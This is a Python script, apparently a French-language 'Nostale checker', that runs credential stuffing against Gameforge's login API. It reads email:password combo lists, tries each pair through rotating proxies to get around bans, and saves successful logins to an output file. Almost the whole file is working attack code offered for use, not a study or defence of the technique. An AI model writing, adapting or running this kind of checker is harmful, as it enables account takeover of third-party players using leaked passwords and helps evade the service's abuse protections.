#Nostale checker (PROXY VERSION) - V4
import sys
import os
import requests as r
from playsound import playsound

def cls():
    os.system('cls')

cls()
api = "https://spark.gameforge.com/api/v1/auth/thin/sessions"
account_number = 0
proxy_number = 0
combo_position = 0
proxy_position = 0
hit = 0
banner = """
 ▐ ▄       .▄▄ · ▄▄▄▄▄ ▄▄▄· ▄▄▌  ▄▄▄ . ▄▄·  ▄ .▄▄▄▄ . ▄▄· ▄ •▄ ▄▄▄ .▄▄▄
•█▌▐█▪     ▐█ ▀. •██  ▐█ ▀█ ██•  ▀▄.▀·▐█ ▌▪██▪▐█▀▄.▀·▐█ ▌▪█▌▄▌▪▀▄.▀·▀▄ █·
▐█▐▐▌ ▄█▀▄ ▄▀▀▀█▄ ▐█.▪▄█▀▀█ ██▪  ▐▀▀▪▄██ ▄▄██▀▐█▐▀▀▪▄██ ▄▄▐▀▀▄·▐▀▀▪▄▐▀▀▄
██▐█▌▐█▌.▐▌▐█▄▪▐█ ▐█▌·▐█ ▪▐▌▐█▌▐▌▐█▄▄▌▐███▌██▌▐▀▐█▄▄▌▐███▌▐█.█▌▐█▄▄▌▐█•█▌
▀▀ █▪ ▀█▄▀▪ ▀▀▀▀  ▀▀▀  ▀  ▀ .▀▀▀  ▀▀▀ ·▀▀▀ ▀▀▀ · ▀▀▀ ·▀▀▀ ·▀  ▀ ▀▀▀ .▀  ▀
                    By Kynda - V4

    Nouvelles fonctions :
        [+] Changement de proxy automatique et infinies
        [+] Pas de sauts de comptes
            
    Merci à ArSenal pour l'api et les keywords
"""

try:
    file = open('combo.txt',"r")
    combo = file.readlines()
    file.close
except IOError:
    create = open("combo.txt","a")
    create.close()
    sys.exit("[!] On dirait bien que tu n'as pas fait de combos.")
try:
    file = open("proxies.txt","r")
    proxies = file.readlines()
    file.close()
except IOError:
    create = open("proxies.txt","a")
    create.close()
    sys.exit("[!] On dirait bien que tu as oublié tes proxies.")
print(banner)
for acc in combo:
    account_number+=1
for proxy in proxies:
    proxy_number+=1
if account_number == 0:
    sys.exit("Le fichier combo est vide.")
if proxy_number == 0:
    sys.exit("Le fichier proxies est vide.")
total_account = str(account_number)
print("[i] Nombre de comptes: "+total_account+'\n[i] Nombre de proxies: '+str(proxy_number))
account_number-=1
while combo_position <= account_number:
    credentials = combo[combo_position]
    credentials = credentials.strip()
    account = credentials.split(":")
    email = account[0]
    password = account[1]
    try:
        actual_proxy = proxies[proxy_position].strip
    except IndexError:
        print("La liste de proxy est épuisé.")
        print("[i] Dernier compte check : "+credentials)
        proxy_position = 0
        actual_proxy = proxies[proxy_position].strip
        print("Le checker recommence avec le premier proxy.")
    actual_proxy = actual_proxy.split(":")
    ip = actual_proxy[0]
    port = actual_proxy[1]
    request_proxy = {
        "https":"https://"+ip+":"+port
        }
    data = {"identity":email,"password":password,"locale":"fr_FR","gfLang":"fr","platformGameId":"dd4e22d6-00d1-44b9-8126-d8b40e0cd7c9"}
    try:
        rep = r.post(api,data=data,proxies=request_proxy)
        if "token" in rep.text:
            playsound('hit.mp3')
            hit+=1
            print("["+str(hit)+"] Nostale [->] " + credentials +"\n")
            save = open("output.txt","a")
            save.write("["+str(hit)+"] Nostale [->]" + credentials+"\n")
            save.close()
            combo_position+=1
        elif "Unauthorized" in rep.text:
            combo_position+=1
            proxy_position+=1
            print("["+str(combo_position) +"/"+total_account+"] "+credentials)
        elif "Forbidden" in rep.text:
            playsound('ban.mp3')
            print("[!] Le proxy est banni")
            proxy_position+=1
        else:
            print("Une erreur inconnue s'est produite : \n"+rep.text)
    except:
        print("[i] Impossible de se connecter au proxy.\nNouvelle connexion proxy établie.")
        proxy_position+=1

sys.exit("[+] Le travail est terminé.")
#Mec j'sais pas quoi ajouter mais 105 lignes c'est vachement + classe